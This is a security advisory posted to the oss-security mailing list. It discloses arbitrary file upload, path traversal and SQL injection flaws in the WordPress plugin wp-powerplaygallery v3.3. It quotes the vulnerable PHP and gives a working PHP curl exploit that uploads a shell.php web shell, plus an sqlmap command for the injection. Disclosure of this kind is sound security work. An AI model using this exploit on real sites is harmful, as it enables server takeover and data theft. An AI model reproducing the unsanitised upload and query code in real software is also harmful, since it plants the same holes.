  oss-security - Remote file upload vulnerability & SQLi in wordpress plugin  wp-powerplaygallery v3.3            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Sun, 12 Jul From: "Larry W. Cashdollar" <larry0@...com> To: Open Source Security <oss-security@...ts.openwall.com> Subject: Remote file upload vulnerability & SQLi in wordpress plugin  wp-powerplaygallery v3.3  Title: Remote file upload vulnerability & SQLi in wordpress plugin wp-powerplaygallery v3.3 Author: Larry W. Cashdollar, @_larry0 Date: Download Site: https://wordpress.org/plugins/wp-powerplaygallery Vendor: WP SlideShow Vendor Notified: Advisory: Vendor Contact: plugins@...dpress.org Description: This is the best gallery for touch screens. It is fully touch enabled with great features. This gallery is compatible wiht iphone and ipads. It is also allow us to use it as a widget.You can also enable this Powerplay Gallery on your wordpress site by placing code snippet in your template (.php) files. It shows flash gallery for desktops and touch enabled version for ipad and iphones. Vulnerability: 1. Ability to create directories out side of the upload path by using ../: Lines of upload.php:  56 // Create target dir 57 if (!file_exists($targetDir)) { 58         @mkdir($targetDir); 59 }        2. Arbitrary file uploads to a path in the web root directory: Lines of uploads.php don’t verify what types of files are allowed or where they should be placed:  // Open temp file if (!$out = @fopen("{$filePath}.part", $chunks ? "ab" : "wb")) {         die('{"jsonrpc" : "2.0", "error" : {"code": "message": "Failed to open output stream."}, "id" :     "id"}'); }  if (!empty($_FILES)) {         if ($_FILES["file"]["error"] || !is_uploaded_file($_FILES["file"]["tmp_name"])) {                 die('{"jsonrpc" : "2.0", "error" : {"code": "message": "Failed to move uploaded file."}    , "id" : "id"}');         }          // Read binary input stream and append it to temp file         if (!$in = @fopen($_FILES["file"]["tmp_name"], "rb")) {                 die('{"jsonrpc" : "2.0", "error" : {"code": "message": "Failed to open input stream."},     "id" : "id"}');         } } else {         if (!$in = @fopen("php://input", "rb")) {                 die('{"jsonrpc" : "2.0", "error" : {"code": "message": "Failed to open input stream."},     "id" : "id"}');         } }  while ($buff = fread($in, {         fwrite($out, $buff); }  3. Sql injection  Lines of upload.php fail to handle user input appropriately either by sanitizing or paramaterizing it. Injection points are any GET/POST to albumid or name.  $query = "INSERT INTO ".$wpdb->prefix."pp_images (`category_id`, `title`, `description`, `price`, `thumb`, `    image`, `status`, `order`, `creation_date` )           VALUES (".$_REQUEST['albumid'].",'".$imgname[0]."','".$imgname[0]."','','".$resize."','".$_REQUEST    ['name']."',1,'','NULL')";            $wpdb->query($query);   CVEID: OSVDB: Exploit Code: 	• <?php 	• /*Remote shell upload exploit for wp-powerplaygallery v3.3 */ 	• /*Larry W. Cashdollar @_larry0 	• 	• albumid needs to be a numeric value matching an existing album number, 1 is probably a good start 	• but you can enumerate these by using curl, and looking for redirect responses: 	• e.g. $ curl http://www.vapidlabs.com/wp-content/uploads/power_play/4_uploadfolder/big 	• exists else doesn't. 	• shell is http://www.vapidlabs.com/wp-content/uploads/power_play/4_uploadfolder/big/shell.php 	• */ 	•   	•   	• 	$target_url = 'http://www.vapidlabs.com/wp-content/plugins/wp-powerplaygallery/upload.php'; 	• 	$file_name_with_full_path = '/var/www/shell.php'; 	•   	•         echo "POST to $target_url $file_name_with_full_path"; 	• 	$post = array('albumid'=>'foo' , 'name' => 'shell.php','file'=>'@...file_name_with_full_path); 	•   	•         $ch = curl_init(); 	• 	curl_setopt($ch, CURLOPT_URL,$target_url); 	• 	curl_setopt($ch, CURLOPT_POST,1); 	• 	curl_setopt($ch, CURLOPT_POSTFIELDS, $post); 	•         curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); 	• 	$result=curl_exec ($ch); 	• 	curl_close ($ch); 	•         echo "<hr>"; 	• 	echo $result; 	•         echo "<hr>"; 	• ?> SQLi PoC: $ sqlmap -u http://www.vapidlabs.com/wp-content/plugins/wp-powerplaygallery/upload.php --data "albumid=1”  —dbms mysql Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      